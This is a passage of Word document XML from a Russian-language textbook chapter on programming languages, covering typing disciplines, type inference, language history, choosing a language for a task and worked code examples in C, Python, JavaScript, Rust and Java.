          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[] + []   // "" (пустая строка)</w:t>
        <w:br/>
        <w:t>[] + {}   // "[object Object]"</w:t>
        <w:br/>
        <w:t>{} + []   // 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Объяснить это можно, но зачем?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сильная типизация:** Python, Java, Rust, Haskell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Слабая типизация:** JavaScript, PHP, Perl.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Автовыведение типов (Type Inference)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компилятор </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сам определяет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> типы переменных. Ты не пишешь типы явно, но язык статически типизирован.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Rust):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>let x = 5;        // компилятор понимает: x — i32</w:t>
        <w:br/>
        <w:t>let y = "hello";  // y — &amp;str</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Haskell):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>add a b = a + b  -- компилятор выводит: add :: Num a =&gt; a -&gt; a -&gt; a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Языки:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Haskell, Rust, Kotlin, Swift, F#, ML.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> лаконичность статической типизации + скорость разработки динамической.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.5. Эволюция языков программирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Языки не возникают из пустоты — они эволюционируют, отвечая на потребности времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Краткая история:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Годы   | Языки             | Зачем появились                                       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-------------------|-------------------------------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1950-е | FORTRAN, LISP     | Научные вычисления (FORTRAN), AI (LISP)              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1960-е | COBOL, ALGOL      | Бизнес-приложения (COBOL), алгоритмы (ALGOL)         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1970-е | C, Pascal, Prolog | Системное программирование (C), обучение (Pascal)    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1980-е | C++, SQL, Perl    | ООП (C++), базы данных (SQL), скрипты (Perl)         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1990-е | Python, Java, JS  | Простота (Python), WORA (Java), веб (JavaScript)     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2000-е | C#, PHP, Ruby     | .NET (C#), веб-бэкенд (PHP, Ruby on Rails)           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2010-е | Go, Rust, Kotlin  | Параллелизм (Go), безопасность (Rust), Android (Kotlin) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2020-е | (Rust/Go растут)  | Системное программирование без C/C++, безопасность   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Тренды 2025:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rust** растёт (безопасность памяти без GC, используется в Linux, Firefox, Discord).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Go** популярен для микросервисов (Google, Uber, Cloudflare).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Python** доминирует в Data Science и ML (TensorFlow, PyTorch).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TypeScript** заменяет JavaScript в больших проектах (добавляет статическую типизацию).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kotlin** вытесняет Java на Android.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.6. Выбор языка для задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Нет "лучшего" языка. Есть язык, подходящий для задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Веб-разработка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фронтенд:** JavaScript/TypeScript (React, Vue, Svelte).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Бэкенд:** Python (Django, FastAPI), JavaScript (Node.js), Go, Rust (Actix), PHP (Laravel).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мобильные приложения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Android:** Kotlin (замена Java).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**iOS:** Swift (замена Objective-C).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кроссплатформа:** Flutter (Dart), React Native (JavaScript).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системное программирование:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ОС, драйверы:** C, Rust.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузеры, базы данных:** C++, Rust.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Научные вычисления / Data Science:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Python (NumPy, Pandas, Matplotlib, SciPy).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>R (статистика).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Julia (производительность + простота).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MATLAB (инженерные расчёты, но платный).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Машинное обучение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Python (TensorFlow, PyTorch, scikit-learn) — 90% рынка.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Игры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C++ (Unreal Engine, кастомные движки).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C# (Unity).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Встраиваемые системы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C, C++ (Arduino, ESP32).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rust (набирает популярность).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Блокчейн:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Solidity (Ethereum smart contracts).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rust (Solana, Polkadot).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Нужно написать веб-сервер, который обрабатывает 100,000 запросов в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python (Flask):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> быстро написать, но медленно работает (1000-5000 RPS на одном ядре).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Go:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> баланс скорость разработки + производительность (50,000-100,000 RPS).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rust (Actix):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> максимальная производительность (200,000+ RPS), но дольше разработка.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Выбор: Go (если нужен быстрый результат) или Rust (если критична производительность).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1.7. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.1-5.2 (Алгоритмы, конструкции):** Все языки содержат последовательность, ветвление, циклы. Алгоритмы — универсальны, язык — инструмент реализации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.2 (Компиляторы и интерпретаторы):** В следующей главе разберём, как код превращается в машинный код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.2 (Сервисное ПО):** Компиляторы (GCC, Clang) и интерпретаторы (Python, JavaScript) — это сервисное ПО.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4 (Моделирование):** Выбор языка зависит от модели решения задачи (математическая модель → Python/MATLAB, системная модель → C/Rust).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Сравнение скорости (императивный vs функциональный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти сумму квадратов чётных чисел от 1 до 10,000,000.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Императивный подход (C):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>long long sum = 0;</w:t>
        <w:br/>
        <w:t>for (int i = 0; i &lt;= 10000000; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (i % 2 == 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        sum += (long long)i * i;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>// Время: ~20 мс (оптимизированный gcc -O3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональный подход (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sum = sum(x**2 for x in range(10000001) if x % 2 == 0)</w:t>
        <w:br/>
        <w:t># Время: ~1200 мс (CPython)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> C в 60 раз быстрее. Но Python код короче и понятнее. Для разового скрипта — Python. Для критичного участка игры — C.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: JavaScript — слабая типизация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Объясни результат:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>console.log("5" - 3);  // 2</w:t>
        <w:br/>
        <w:t>console.log("5" + 3);  // "53"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объяснение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**"5" - 3:** оператор `-` работает только с числами. JS преобразует `"5"` → `5`, результат: `5 - 3 = 2`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**"5" + 3:** оператор `+` может складывать числа и конкатенировать строки. JS видит строку, преобразует `3` → `"3"`, результат: `"5" + "3" = "53"`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Слабая типизация — источник багов. В TypeScript (статическая типизация поверх JS) такое словил бы на этапе компиляции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Выбор языка для стартапа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Стартап хочет быстро создать MVP (минимально жизнеспособный продукт) веб-приложения. Бюджет маленький, команда 2 человека. Что выбрать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Варианты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Язык       | Скорость разработки | Производительность | Экосистема | Найм программистов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|---------------------|--------------------|-----------|--------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Python     | ⚡⚡⚡               | ⚡⚡                | +++       | ++                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| JavaScript | ⚡⚡⚡               | ⚡⚡⚡              | ++++      | +++                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Go         | ⚡⚡                 | ⚡⚡⚡⚡            | ++        | +                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Rust       | ⚡                   | ⚡⚡⚡⚡⚡          | +         | +                  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Python (Django/FastAPI) или JavaScript (Node.js). Причина: быстро разработать, много библиотек, легко найти разработчиков. Go/Rust — overkill для MVP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Автовыведение типов (Rust)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Что выведет код?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>let x = 5;</w:t>
        <w:br/>
        <w:t>let y = 10;</w:t>
        <w:br/>
        <w:t>let z = x + y;</w:t>
        <w:br/>
        <w:t>println!("{}", z);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `15`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объяснение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компилятор Rust видит `x = 5` → выводит тип `i32` (32-битное целое, по умолчанию).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`y = 10` → тоже `i32`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`z = x + y` → `i32 + i32 = i32`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Типы не написаны явно, но язык статически типизирован. Если попытаешься `x + "hello"` — ошибка компиляции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Почему ООП не всегда лучше</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Написать функцию, которая фильтрует массив.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ООП-подход (Java):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>class ArrayFilter {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    private int[] array;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    public ArrayFilter(int[] array) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        this.array = array;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    public int[] filterEven() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        List&lt;Integer&gt; result = new ArrayList&lt;&gt;();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        for (int x : array) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            if (x % 2 == 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                result.add(x);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            }</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return result.stream().mapToInt(i -&gt; i).toArray();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>ArrayFilter filter = new ArrayFilter(new int[]{1, 2, 3, 4});</w:t>
        <w:br/>
        <w:t>int[] result = filter.filterEven();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональный подход (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>result = [x for x in [1, 2, 3, 4] if x % 2 == 0]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ООП — мощный инструмент для больших систем (моделирование сущностей). Но для простых задач — избыточен. Функциональный подход лаконичнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень абстракции** — удалённость языка от железа (низкий уровень = ассемблер, высокий = Python).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Машинный код** — последовательность битов, понятная процессору.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ассемблер** — символьное представление машинного кода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компилятор** — программа, переводящая код в машинный код до запуска.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интерпретатор** — программа, выполняющая код построчно.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Байт-код** — промежуточный код, выполняемый виртуальной машиной.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT (Just-In-Time)** — компиляция байт-кода в машинный код во время выполнения.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Парадигма программирования** — стиль программирования (императивное, ООП, функциональное, логическое).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Императивное программирование** — последовательность команд, изменяющих состояние.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ООП (Объектно-ориентированное программирование)** — программа состоит из объектов (данные + методы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Функциональное программирование** — программа — композиция чистых функций, без изменяемого состояния.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
